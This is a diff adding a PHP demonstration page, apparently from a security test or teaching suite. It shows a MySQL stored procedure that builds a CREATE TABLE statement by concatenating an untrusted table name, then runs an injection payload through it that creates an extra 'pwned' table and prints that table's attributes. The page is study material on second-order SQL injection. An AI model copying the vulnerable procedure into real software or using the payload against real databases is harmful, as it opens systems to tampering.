@@ -1,0 +1,54 @@
+<?
+    require ("kernel.dll");
+    header  ("content-type: text/plain");
+
+    $conn = sql_connect();
+?>
+<? create_case_header("Vulnerable SQL Code") ?>
+<?=highlight_string(
+'CREATE PROCEDURE create_private_table (
+  table_name TEXT
+) 
+  BEGIN
+    SET @query = CONCAT(\'CREATE TABLE \', table_name ,\'_ptable (k int)\');
+    PREPARE stmt FROM @query;
+    EXECUTE stmt;
+    DEALLOCATE PREPARE stmt;
+  END;
+', true)?> <br />
+!---!
+<? create_case_header("Commence Attack") ?>
+<?=highlight_string(
+'$datetime = date("Ymdhisv");
+$query = "pwned_$datetime(id int, c varchar(35)); -- ";
+
+$stmt = mysqli_prepare($conn, "CALL create_private_table(?)");
+$stmt->bind_param("s", $query);
+$stmt->execute();', true)?> <br /> <br />
+-!!!-
+
+!---!
+<? create_case_header("Attack Result");
+    $datetime = date("Ymdhisv");
+    $query = "pwned_$datetime(id int, c varchar(35)); -- ";
+
+    $stmt = mysqli_prepare($conn, "CALL create_private_table(?)");
+    $stmt->bind_param("s", $query);
+    $stmt->execute();
+?>
+<pre>  
+<?
+    echo "Execution Result: " . ($stmt->errno === 0 ? "Success (mysqli::stmt::errno === 0)" : "Failed");
+    if ($stmt->errno !== 0) {
+        echo "<br />Error: ". $conn->error;
+    } else {
+        echo "<br />Created Table Name: pwned_$datetime<br />";
+        $query = mysqli_query($conn, "describe pwned_$datetime");
+        
+        create_case_header("Attributes of created table");
+        while ($att = $query->fetch_assoc()) {
+            var_dump($att);
+        }
+    }
+?>
+</pre>
